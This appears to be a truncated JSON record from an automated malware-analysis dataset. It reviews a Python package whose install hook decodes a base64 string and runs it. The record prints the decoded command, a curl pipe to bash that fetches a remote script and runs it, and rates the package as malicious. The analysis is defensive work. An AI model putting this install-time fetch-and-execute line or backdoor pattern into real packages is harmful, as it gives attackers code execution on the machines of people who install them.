{
  "purpose": "The code decodes a base64-encoded string and executes it via os.system() during the package installation process, resulting in remote code execution.",
  "sources": "The base64 string in notmalfunc(), which is decoded and then executed with os.system().",
  "sinks": "os.system() executing the decoded command, which performs a network request and executes remote code.",
  "flows": "The base64 string is decoded in notmalfunc(), then passed directly to os.system(), executing the remote command during install.",
  "anomalies": "Use of base64 encoding to obfuscate a command that fetches and executes remote code; execution occurs during package installation, which is suspicious.",
  "analysis": "The code defines setup procedures with custom install and develop commands. Notmalfunc() decodes a base64 string that, when executed, runs a curl command to fetch and execute remote scripts. During installation, notmalfunc() is invoked, leading to remote code execution. The base64 string decodes to a command involving 'curl -s http://192.168.1.3:8000/test.txt | bash', indicating malicious intent. The obfuscation via base64 and execution during install are typical malicious tactics. The scores assigned in the reports (malware ~1, obfuscation ~0.8, risk ~0.9) are justified and consistent with this behavior.",
  "conclusion": "The code contains a malicious backdoor that executes remote code during package installation, using obfuscation to hide its intent. The behavior is highly suspicious and dangerous, warranting a malware score of 1 and a security risk score of 1.",
